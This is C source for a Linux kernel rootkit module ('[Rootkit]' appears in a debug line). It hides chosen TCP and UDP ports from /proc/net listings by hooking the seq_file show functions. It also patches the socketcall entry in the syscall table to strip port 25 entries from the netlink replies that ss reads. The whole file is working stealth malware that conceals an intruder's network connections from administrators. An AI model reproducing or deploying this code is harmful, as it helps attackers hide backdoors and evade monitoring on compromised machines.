#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>
#include <linux/inet_diag.h>
#include <linux/socket.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_sockets.h"


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
// for hooking the original read function
typedef int (*fun_int_seq_file_void) (struct seq_file*, void*);
fun_int_seq_file_void tcp_show_orig;
fun_int_seq_file_void udp_show_orig;

typedef asmlinkage long (*fun_long_int_unsigned_long)(int, unsigned long __user*);
fun_long_int_unsigned_long orig_socketcall;

#define OUR_PROT_TCP 1
#define OUR_PROT_UDP 2

struct l_socket_to_hide {
    int port;
    int prot;
    struct list_head list;
};

struct list_head sockets_to_hide;

int port_to_hide = -1;
char* prot_to_hide = "";

void hide_socket(char *protocol, int port){
    struct l_socket_to_hide* toHide;
    toHide = kmalloc(sizeof(struct l_socket_to_hide), GFP_KERNEL);  
    // fill struct with protocoll and port
    toHide->port = port;
    if (strcmp (protocol, "udp") == 0){
        toHide->prot = OUR_PROT_UDP;
    }
    else {
        toHide->prot = OUR_PROT_TCP;
    }
    // add the new socket to hide to the sockets to be hidden
    list_add(&toHide->list, &sockets_to_hide);
    /* list_for_each(cur, &sockets_to_hide){
        OUR_DEBUG("Hidden socket: %d on port %d\n", cur->prot, cur->port);
    } */
}

void unhidesocket(int prot, int port){
    struct list_head* cur;
    struct list_head* cur2;
    struct l_socket_to_hide* socket;
    list_for_each_safe(cur, cur2, &sockets_to_hide){
        socket = list_entry(cur, struct l_socket_to_hide, list);
        if (socket->port == port && socket->prot == prot){
            list_del(cur);
            kfree(socket);
        }
    }
}

void hideTCP(int port){
    hide_socket("tcp", port);
}

void hideUDP(int port){
    hide_socket("udp", port);
}

void unhideTCP(int port){
    unhidesocket(OUR_PROT_TCP, port);
}

void unhideUDP(int port){
    unhidesocket(OUR_PROT_UDP, port);
}

static int hooked_udp_show(struct seq_file* file, void* v){
    int port;
    struct sock* sk;
    struct inet_sock* s;
    struct l_socket_to_hide* socket;
    struct list_head* cur;
    // if (strcmp(prot_to_hide, "udp")){
    //     return udp_show_orig(file, v);
    // }
    if (v == SEQ_START_TOKEN) {
        return udp_show_orig(file, v);
    }
    sk = (struct sock*) v;
    s = inet_sk(sk);
    OUR_DEBUG("pointer : %p\n", s);
    port = ntohs(s->sport);
    OUR_DEBUG("udp_show port: %d\n", s->sport);
    list_for_each(cur, &sockets_to_hide){
        socket = list_entry(cur, struct l_socket_to_hide, list);
        if (port == socket->port && socket->prot == OUR_PROT_UDP){
            return 0;
        } 
    }
    return udp_show_orig(file, v);
}

static int hooked_tcp_show(struct seq_file* file, void* v){
    int port;
    struct sock* sk;
    struct inet_sock* s;    
    struct l_socket_to_hide* socket;
    struct list_head* cur;
    if (v == SEQ_START_TOKEN) {
        return tcp_show_orig(file, v);
    }
    sk = (struct sock*) v;
    s = inet_sk(sk);
    port = ntohs(s->sport);
    list_for_each(cur, &sockets_to_hide){
        socket = list_entry(cur, struct l_socket_to_hide, list);
        if (port == socket->port && socket->prot == OUR_PROT_TCP){
            return 0;
        } 
    }
    return tcp_show_orig(file, v);
}

static int checkport(struct nlmsghdr *nlh){
    struct inet_diag_msg *r = NLMSG_DATA(nlh);
    //struct tcpstat s;
    //s.state = r->idiag_state;
    //s.local.family = s.remote.family = r->idiag_family;
	//s.lport = ntohs(r->id.idiag_sport);
	//s.rport = ntohs(r->id.idiag_dport);
    int lport = ntohs(r->id.idiag_sport);
    int rport = ntohs(r->id.idiag_dport);
    //printk(KERN_ALERT "[Rootkit] lport %d, rport %d\n", lport, rport);
    return lport == 25;
}

asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
    // when a socket gets opened with exaclty the arguments which ss uses, return -1
    // returning -1 causes ss to try it via /proc/net, which we already hooked
    //struct msghdr* msg = (void*)&(((unsigned int*)args)[1]);
    //struct iovec* iov = msg->msg_iov;
    //char *buf = iov->iov_base;
    //struct nlmsghdr* h = (struct nlmsghdr*)buf;

    long retval;
    long status; // this is just for consistence with varnames of "ss"
    // struct msghdr* msg = (struct msghdr*)&(((unsigned int*)args)[1]);
    struct msghdr* msg;
    struct nlmsghdr* h;
    __kernel_size_t numblocks;
    struct inet_diag_msg *r;
    int err;
    struct nlmsgerr *nlmsg_err;
    char* previous;
    char* currhdr;
    int i;
    int found=0;
    int step=0;

    if(call == SYS_RECVMSG){
        // retrieve data structures
        msg = (struct msghdr*)(((int*)args)[1]);
        h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
        numblocks = msg->msg_iovlen;
        r = NLMSG_DATA(h);
        // compute "real" result with orig_socketcall
        retval = orig_socketcall(call, args);
        // status holds the bytes remaining
        status = retval;

        previous = NLMSG_DATA(h);
        while (NLMSG_OK(h, status)) {
            printk(KERN_ALERT "step %d\n", step++);
            currhdr = (char*)h;

            if (found == 0){
                h = NLMSG_NEXT(h, status);
            }
            if (checkport(h)){
                found = 1;
                printk(KERN_ALERT "Port 25. Doing stuff.\n");
                for (i=0; i<status; ++i){
                    // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
                    currhdr[i] = currhdr[i + NLMSG_ALIGN((h)->nlmsg_len)];
                }
                retval = retval - NLMSG_ALIGN((h)->nlmsg_len);
            }
            else {
                found = 0;
            }
        }
        return retval;
    }
    return orig_socketcall(call, args);
}

asmlinkage long hooked_socketcall_old_version(int call, unsigned long __user* args){
    // when a socket gets opened with exaclty the arguments which ss uses, return -1
    // returning -1 causes ss to try it via /proc/net, which we already hooked
    if(call == SYS_SOCKET && args[0] == AF_NETLINK && args[1] == SOCK_RAW && args[2] == NETLINK_INET_DIAG)
        return -1;
    return orig_socketcall(call, args);
}

void load_sockethiding(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table = (void*)ptr_sys_call_table;
    int counter = 0;
    while (p && counter <2){
        if (strcmp(p->name, "tcp")==0){
            tcp_seq = p->data;
            tcp_show_orig = tcp_seq->seq_ops.show;
            tcp_seq->seq_ops.show = hooked_tcp_show;
            counter++;
        }
        if (strcmp(p->name, "udp")==0){
            udp_seq = p->data;
            udp_show_orig = udp_seq->seq_ops.show;
            udp_seq->seq_ops.show = hooked_udp_show;
            counter++;
        }
        p = p->next;
    }

    orig_socketcall = (fun_long_int_unsigned_long)syscall_table[__NR_socketcall];
    make_page_writable((long unsigned int)ptr_sys_call_table);
    syscall_table[__NR_socketcall] = hooked_socketcall;
    make_page_readonly((long unsigned int)ptr_sys_call_table);
    INIT_LIST_HEAD(&sockets_to_hide);
}

void unload_sockethiding(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    struct l_socket_to_hide *socket;
    struct list_head *pos;
    struct list_head *pos2;
    void** syscall_table;
    int counter = 0;
    while (p && counter <2){
        if (strcmp(p->name, "tcp")==0){
            tcp_seq = p->data;
            tcp_seq->seq_ops.show = tcp_show_orig;
            counter++;
        }
        if (strcmp(p->name, "udp")==0){
            udp_seq = p->data;
            udp_seq->seq_ops.show = udp_show_orig;
            counter++;
        }
        p = p->next;
    }

    syscall_table = (void**) ptr_sys_call_table;
    make_page_writable((long unsigned int)ptr_sys_call_table);
    syscall_table[__NR_socketcall] = orig_socketcall;
    make_page_readonly((long unsigned int)ptr_sys_call_table);

    list_for_each_safe(pos, pos2, &sockets_to_hide){
        socket = list_entry(pos, struct l_socket_to_hide, list);
        list_del(pos);
        kfree(socket);
    }
}
